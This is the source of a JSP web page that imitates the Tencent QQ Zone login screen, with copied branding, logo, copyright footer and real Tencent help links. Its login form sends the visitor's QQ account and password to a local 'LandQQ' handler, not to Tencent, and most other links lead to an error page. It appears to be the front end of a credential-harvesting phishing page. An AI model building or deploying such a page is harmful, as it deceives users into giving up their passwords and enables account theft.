<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>QQ空间-分享生活，留住感动</title>
        <meta name="Qzone" content="QQ空间(Qzone)是中国最大的社交网络。">
        <link rel="stylesheet" type="text/css" media="screen" href="Landqq.css" />
        <script src="Jquery.js"></script>
        <script src="main.js"></script>
</head>
<body style="overflow:hidden">
    <div class="p-ab" style="top: -180px; left: 0px;">
        <div class="p-ab" style="top:270px; left:310px; height: 98px; width: 251px;">  <!--logo框-->
            <img id="qzone-logo" src="qzone-logo.png" />
        </div>
        <div class="p-ab" id="land"> <!--登陆框-->
            <div class="qlogin" id="qlogin0">
                <span>帐号密码登录</span>
            </div>
            <div class="qlogin" id="inPut">
            	<form action="LandQQ" method="post">
	                <div class="in">
	                    <input class="inAccount" name="account" type="text" maxlength="20" placeholder="&nbsp;支持QQ号/邮箱/手机号登陆"/>
	                </div>
	                <div class="in">
	                    <input class="inAccount" name="password" type="password" maxlength="20" placeholder="&nbsp;密码"/>
	                </div>
	                <div class="in">
	                    <button id="sub" type="submit">登&nbsp;陆</button>        
	                </div>
            	</form>
                <div id="error" style="position: absolute;width: 100%; height: 20px; color: red;"></div>
            </div>
            <div class="u">
                <a href="https://aq.qq.com/v2/uv_aq/html/reset_pwd/pc_reset_pwd_input_account.html?v=3.0&old_ver_account=">忘记密码？</a>
                <span>|</span>
                <a href="https://ssl.zc.qq.com/v3/index-chs.html">注册新账号</a>
                <span>|</span>
                <a href="https://support.qq.com/products/14800">意见反馈</a>
            </div>
        </div>
        <div class="p-ab" id="system">
            <ul>
                <a href="error.html">
                    <li style="background-position-x: 298px;"><span>iPhone</span></li>
                </a>
                <a href="error.html">
                    <li style="background-position-x: 240px;"><span>iPad</span></li>
                </a>
                <a href="error.html">
                    <li style="background-position-x: 180px;"><span>Android</span></li>
                </a>
                <a href="error.html">
                    <li style="background-position-x: 59px;"><span>windows<br/>Phone</span></li>
                </a>
                <a href="error.html">
                    <li style="background-position-x: 118px;"><span>其他手机</span></li>
                </a>
            </ul>
        </div>
        <div class="p-ab" id="foot">
            <p>
                <a href="error.html">反馈建议</a> |
                <a href="error.html">官方空间</a> |
                <a href="error.html">空间活动</a> |
                <a href="error.html">空间应用</a> |
                <a href="error.html">腾讯创始馆</a> |
                <a href="error.html">QQ互联</a> |
                <a href="error.html">QQ登陆</a> |
                <a href="error.html">社交组建</a> |
                <a href="error.html">应用侵权</a> |
                <a href="error.html">Complaint Guidelines</a>
            </p>
            <p>
                Copyright &copy; 2005 - 2018 Tencent.All Rights Reserved.
            </p>
            <p>腾讯公司 版权所有 粤网文[2017]6138-1456号</p>
        </div>
        <img class="lay_background" src="backimg.jpg" /> <!--设置背景图片-->
    </div>
</body>
</html>